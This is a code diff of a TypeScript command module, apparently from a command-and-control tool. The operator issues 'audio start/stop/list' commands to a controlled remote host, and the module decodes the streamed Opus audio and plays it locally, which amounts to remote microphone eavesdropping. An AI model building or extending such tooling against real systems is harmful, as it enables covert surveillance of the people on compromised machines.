@@ -1,20 +1,26 @@
 import Speaker = require('speaker');
-import { Packet } from '../../../../common/src/protocol';
 import { ControlServer } from '../../controlserver';
 import { CommandList } from '../../registry';
+import { Packet } from 'c2lib';
+import { OpusEncoder } from '@discordjs/opus';
 
-/**
- * @type Speaker
- */
 let spk: Speaker;
+let enc: OpusEncoder;
 
 export = function (commands: CommandList) {
-	commands['audio'] = audio;
 	spk = new Speaker({
-		channels: 1,
 		bitDepth: 16,
-		sampleRate: 16000,
+		channels: 1,
+		sampleRate: 44100
 	});
+	enc = new OpusEncoder(48000, 1);
+	commands['audio'] = audio;
+}
+
+function audioHandler(packet: Packet) {
+	if (packet._ptype.name === 'audio') {
+		spk.write(enc.decode(packet.data));
+	}
 }
 
 async function audio(server: ControlServer, args: string[]) {
@@ -26,38 +32,31 @@ async function audio(server: ControlServer, args: string[]) {
 	let packet = server.commandPacket('audiocommand');
 	switch (args[1]) {
 		case 'start': {
-				packet.command = 0;
-				let ret = await server.sendHostCommand(packet);
-				if (ret == 0) {
-					server.currentHost!.on('packet', audioHandler);
-					console.log('Audio server started');
-				}
-				return;
+			packet.command = 0;
+			let ret = await server.sendHostCommand(packet);
+			if (ret == 0) {
+				server.currentHost!.on('packet', audioHandler);
+				console.log('Audio server started');
 			}
+			return;
+		}
 		case 'stop': {
-				packet.command = 1;
-				let ret = await server.sendHostCommand(packet);
-				server.currentHost!.removeListener('packet', audioHandler);
-				if (ret == 0) {
-					console.log('Audio server stopped');
-				}
-				return;
+			packet.command = 1;
+			let ret = await server.sendHostCommand(packet);
+			if (ret == 0) {
+				server.currentHost!.off('packet', audioHandler);
+				console.log('Audio server stopped');
 			}
+			return;
+		}
 		case 'list': {
-				packet.command = 2;
-				await server.sendHostCommand(packet);
-				return;
-			}
+			packet.command = 2;
+			await server.sendHostCommand(packet);
+			return;
+		}
 		case 'save':
 			return;
 		default:
 			console.log(`Usage: ${args[0]} <start|stop|list>`);
-	}
-}
-
-
-function audioHandler(packet: Packet) {
-	if (packet._ptype.name == 'audio') {
-		spk.write(packet.data);
 	}
 }
